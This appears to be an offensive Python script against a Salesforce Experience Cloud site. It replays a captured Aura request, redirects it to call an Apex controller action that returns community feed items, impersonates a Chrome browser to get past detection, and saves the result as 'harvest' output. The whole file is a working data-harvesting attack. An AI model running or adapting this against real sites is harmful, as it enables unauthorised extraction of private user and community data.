import json
from curl_cffi import requests
import urllib.parse

print("[*] Loading captured request structure...")
with open("captured_aura_request.json", "r") as f:
    base_req = json.load(f)

# Use the exact captured URL with query routing parameters intact
url = base_req["url"]
headers = base_req["headers"]
original_post_data = base_req["post_data"]

parsed_data = dict(urllib.parse.parse_qsl(original_post_data))

# Construct target action payload for SupportCommunityFeedController
target_descriptor = "apex://SupportCommunityFeedController/ACTION$getFeedItems"

message_obj = {
    "actions": [
        {
            "id": "500;a",
            "descriptor": target_descriptor,
            "callingDescriptor": "UNKNOWN",
            "params": {"communityId": "", "feedFilterType": "All", "pageSize": 25}
        }
    ]
}

parsed_data["message"] = json.dumps(message_obj)
new_post_data = urllib.parse.urlencode(parsed_data)

session = requests.Session()
print(f"[*] Dispatching query-routed Aura request to {target_descriptor}...")

res = session.post(url, headers=headers, data=new_post_data, impersonate="chrome120", timeout=15)
print(f"[+] Status Code: {res.status_code} | Length: {len(res.text)}")
print(f"[+] Response Preview:\n{res.text[:2000]}")

with open("harvest_v3_output.json", "w") as out:
    out.write(res.text)

print("[+] Saved response to harvest_v3_output.json")

